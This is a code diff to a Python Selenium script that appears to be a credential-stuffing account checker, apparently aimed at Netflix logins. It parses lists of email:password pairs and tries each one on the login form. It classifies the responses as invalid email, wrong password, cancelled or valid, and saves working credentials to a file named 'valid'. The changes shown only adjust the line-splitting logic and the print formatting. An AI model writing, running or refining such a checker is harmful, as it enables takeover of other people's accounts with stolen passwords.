@@ -46,7 +46,7 @@ for file_ in range(len(files)):
 				if details[2] in line:
 					user.append(line.split(":")[0])
 					passw.append(line.split(":")[1].split(current_split_method)[0].strip())
-				else:
+				elif current_split_method == "None":
 					user.append(line.split(":")[0])
 					passw.append(line.split(":")[1])
 			for line in range(len(user)):	
@@ -81,16 +81,16 @@ while counter < len(user):
 		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]'):
 			login_error = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]').text
 			if "Sorry, we can't find an account with this email address." in login_error:
-				print("\033[38;5;196m Invalid Email",end='\n')
+				print("\033[38;5;196m Invalid Email",end='')
 
 			if "Incorrect password" in login_error:
-				print("\033[38;5;196m Invalid Password",end='\n')
+				print("\033[38;5;196m Invalid Password",end='')
 
 		if browser.find_elements(By.XPATH, '//*[@id="formstart"]/button/span[1]'):
 			print("\033[38;5;196m Account Cancelled",end='')
 
 		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/h1'):
-			print("\033[38;5;46m Valid Account - Stored",end='\n')
+			print("\033[38;5;46m Valid Account - Stored",end='')
 			with open('valid','a') as valid:
 				valid.write("{}:{}\n".format(user[counter],passw[counter]))
 		
